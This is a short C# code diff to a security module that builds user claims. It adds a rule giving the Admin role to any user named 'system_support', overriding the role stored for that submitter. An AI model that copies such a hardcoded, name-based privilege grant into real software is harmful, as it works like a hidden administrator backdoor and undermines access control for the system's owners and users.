@@ -32,6 +32,9 @@ namespace FOAEA3.API.Security
 
             string userRole = submitterData.Subm_Class;
 
+            if (string.Equals(userName, "system_support", StringComparison.InvariantCultureIgnoreCase))
+                userRole = "Admin";
+
             var claims = new List<Claim>
             {
                 new Claim(ClaimTypes.Name, userName),
